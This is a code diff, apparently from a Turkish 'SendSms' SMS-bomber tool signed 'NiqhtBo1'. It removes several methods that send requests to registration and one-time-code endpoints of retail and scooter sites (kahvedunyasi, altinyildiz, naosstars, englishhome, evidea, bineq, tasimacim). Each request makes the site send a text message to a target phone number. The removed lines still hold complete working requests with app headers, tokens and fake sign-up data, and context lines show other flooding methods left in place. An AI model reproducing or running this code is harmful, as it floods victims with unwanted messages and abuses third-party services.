@@ -13,23 +13,6 @@ class SendSms():
             self.mail = mail
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
-
-
-    #kahvedunyasi.com
-    def KahveDunyasi(self):    
-        try:    
-            kahve_dunyasi = requests.post("https://www.kahvedunyasi.com/kayit-ol", data={
-                "mobilenumber": self.phone,
-                "token_type": "register_token"
-            })
-            if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> kahvedunyasi.com")
-                self.adet += 1
-            else:
-                raise
-        except:    
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> kahvedunyasi.com")
-        
      
     #wmf.com.tr
     def Wmf(self):
@@ -69,35 +52,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
     
 
-    #ayyildiz.com.tr
-    def Ayyildiz(self):
-        try:
-            url = f"https://api.altinyildizclassics.com:443/mobileapi2/autapi/CreateSmsOtpForRegister?gsm={self.phone}"
-            headers = {"Accept": "*/*", "Token": "MXZ5NTJ82WXBUJB7KBP10AGR3AF6S4GB95VZDU4G44JFEIN3WISAC2KLRIBNONQ7QVCZXM3ZHI661AMVXLKJLF9HUKI5SQ2ROMZS", "Devicetype": "mobileapp", "Accept-Encoding": "gzip, deflate", "User-Agent": "altinyildiz/2.7 (com.brmagazacilik.altinyildiz; build:2; iOS 15.7.7) Alamofire/2.7", "Accept-Language": "en-TR;q=1.0, tr-TR;q=0.9"}
-            r = requests.post(url, headers=headers)
-            if r.json()["Success"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.altinyildizclassics.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.altinyildizclassics.com")
-
-
-    #naosstars.com
-    def Naosstars(self):
-        try:
-            url = "https://naosstars.com/user/register"
-            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
-            json={"telephone": f"+90{self.phone}", "first_name": "memati", "last_name": "baş", "email": self.email, "new_password": "ABC_aBASDC_5423_vAS" , "type": "register"}
-            r = requests.post(url, headers=headers, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
+   
 
 
     #bim
@@ -113,19 +68,7 @@ class SendSms():
             print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
 
 
-    #englishhome.com
-    def Englishhome(self):
-        try:
-            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{self.phone}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
-            home = requests.post("https://www.englishhome.com/register/enh_app/users", data=data)
-            if home.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> englishhome.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> englishhome.com")
-    
+
 
 
     #icq.net
@@ -146,20 +89,7 @@ class SendSms():
     
     
    
-    #evidea.com
-    def Evidea(self):
-        try:
-            url = "https://www.evidea.com:443/users/register/"
-            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
-            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
-            r = requests.post(url, headers=headers, data=data)      
-            if r.status_code == 202:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com") 
+    #evidea.co
             
         
     #marti.tech
@@ -176,21 +106,6 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
 
-
-
-    #bineq.tech
-    def Bineq(self):
-        try:
-            url = f"https://bineqapi.heymobility.tech:443/V3//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}"
-            header= {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/128 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Accept-Language": "tr"}
-            r = requests.post(url, headers=header)
-            if r.json()["IsSuccess"] == True:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> bineqapi.heymobility.tech")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> bineqapi.heymobility.tech")
 
         
    
@@ -215,19 +130,6 @@ class SendSms():
    
    
     #tasimacim.com
-    def Tasimacim(self):
-        try:
-            url = "https://server.tasimacim.com/requestcode"
-            json= {"phone": self.phone, "lang": "tr"}
-            r = requests.post(url=url, json=json)
-            if r.status_code == 200:
-                print(f"{Fore.LIGHTGREEN_EX}Made By NiqhtBo1 | [+] {Style.RESET_ALL}Başarılı! {self.phone} --> server.tasimacim.com")
-                self.adet += 1
-            else:
-                raise
-        except:
-            print(f"{Fore.LIGHTRED_EX}Made By NiqhtBo1 | [-] {Style.RESET_ALL}Başarısız! {self.phone} --> server.tasimacim.com")
-    
     
     
     #yuffi.co
